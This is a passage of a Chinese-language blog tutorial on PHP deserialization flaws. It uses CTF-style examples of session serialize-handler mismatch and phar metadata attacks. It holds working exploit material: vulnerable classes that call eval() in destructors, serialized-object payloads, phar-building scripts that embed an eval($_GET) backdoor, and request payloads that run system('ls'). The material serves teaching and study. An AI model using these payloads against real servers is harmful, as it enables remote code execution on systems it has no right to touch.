<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class D&#123;</span><br><span class="line">    var $a;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>所以以php格式读取时会把<u>O:1:”D”:1:{s:1:”a”;s:10:”phpinfo();”;}</u>“;}进行反序列化unserialize(),反序列化触发<code>__destruct()</code>，执行eval()  </p>
<h3 id="session反序列化漏洞例题"><a href="#session反序列化漏洞例题" class="headerlink" title="session反序列化漏洞例题"></a>session反序列化漏洞例题</h3><p><strong>index.php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*hint.php*/</span><br><span class="line">session_start();</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $her;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;her=md5(rand(1, 10000));</span><br><span class="line">        if ($this-&gt;name===$this-&gt;her)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>hint.php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>构造：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $her;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Flag();</span><br><span class="line">$a-&gt;name = &amp;$a-&gt;her;</span><br><span class="line">echo serialize($a);</span><br><span class="line">//O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>payload:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>什么是phar？<br>JAR是开发Java程序一个应用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单。<br><strong>like a Java JAR,but for PHP</strong><br>PHAR(“Php Archive”)是PHP里类似于JAR的一种打包文件。<br>对于PHP 5.3或更高版本，Phar后缀文件是默认开启支持的，可以直接使用它。<br>文件包含：phar伪协议，可读取.phar文件。<br><strong>Phar结构：</strong><br>stub phar文件标识，格式为<code>xxx&lt;?php xxx;__HALT_COMPiLER();?&gt;;</code>(头部信息)<br>manifest压缩文件的属性等信息，以序列化存储;<br>contents压缩文件的内容;<br>signature签名，放在文件末尾;  </p>
<p><strong>Phar漏洞原理：</strong><br>manifest压缩文件的属性等信息，以序列化存储;存在一段序列化存储的字符串；<br>调用phar伪协议，可读取.phar文件<br>Phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化<br>Phar需要PHP &gt;&#x3D;5.2在php.ini中将phar.readonly设为off(注意去掉前面的分号)<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230924043436.png"><br><strong>index.php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Testobj</span><br><span class="line">&#123;</span><br><span class="line">    var $output=&quot;echo &#x27;ok&#x27;;&quot;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;filename&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">    var_dump(file_exists($filename));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Testobj</span><br><span class="line">&#123;</span><br><span class="line">    var $output=&#x27;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)</span><br><span class="line">$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀</span><br><span class="line">$phar-&gt;startBuffering();  //开始写文件</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub</span><br><span class="line">$o=new Testobj();</span><br><span class="line">$o-&gt;output=&#x27;eval($_GET[&quot;a&quot;]);&#x27;;</span><br><span class="line">$phar-&gt;setMetadata($o);//写入meta-data</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">//生成phar文件test.phar</span><br><span class="line">//给output赋值`eval($_GET[&quot;a&quot;]);，则a的值可控`</span><br><span class="line">?&gt;&#x27;</span><br></pre></td></tr></table></figure>
<p>提交文件名filename,file_exists读取文件<br><code>__destruct</code>把<code>output(echo &#39;ok&#39;)</code>值调用并输出</p>
<p>**payload:  **</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filenmae=phar://test.php&amp;a=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
<p><strong>Phar使用条件：</strong>  </p>
<ol>
<li>phar文件能上传到服务器端;  </li>
<li>要有可用反序列化魔术方法作为跳板;  </li>
<li>要有文件操作函数，如file_exists(), fopen(), file_get_contents()  </li>
<li>文件操作函数参数可控，且:<code>、</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤<br>phar文件上传不看后缀</li>
</ol>
<h3 id="phar反序列化例题"><a href="#phar反序列化例题" class="headerlink" title="phar反序列化例题"></a>phar反序列化例题</h3><p><strong>index.php</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        include(&#x27;flag.php&#x27;);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_POST[&#x27;file&#x27;];</span><br><span class="line">if (isset($filename))&#123;</span><br><span class="line">    echo md5_file($filename);</span><br><span class="line">&#125;</span><br><span class="line">//upload.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>目标：<code>echo $flag</code><br>反序列化TestObject()触发<code>__destruct()</code>执行<code>echo $flag</code><br><code>$_POST</code>提交file赋值<code>$filename</code>,判断文件是否存在并<code>echo md5_file($filename)</code><br>解析步骤：<br>生成一个phar文件，在mate-data里放置一个包含TestObject()的序列化字符串；<br>上传文件；<br><code>md5_file</code>执行phar伪协议，触发反序列化；<br>反序列化TestObject()触发<code>__destruct</code>执行<code>echo $flag</code><br><strong>构造并运行：</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)</span><br><span class="line">$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀</span><br><span class="line">$phar-&gt;startBuffering();  //开始写文件</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub</span><br><span class="line">$o=new TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o);//写入meta-data</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>改名为poc.png<br>在upload.php页面上传成功后，在index.php页面用post方法提交<code>file=phar://upload/poc.png</code>,执行phar伪协议触发反序列化，反序列化TestObject()触发<code>__destruct</code>执行<code>echo $flag</code>   </p>
        
          <p class="article-more-link">
            <a href="/2023/09/24/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E4%B9%8BPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/09/24/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E4%B9%8BPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="clmwl59450000vkvmelyo7olh" data-title="web基础漏洞之PHP反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/09/24/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E4%B9%8BPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">web基础漏洞之PHP反序列化</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 [object Object]<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>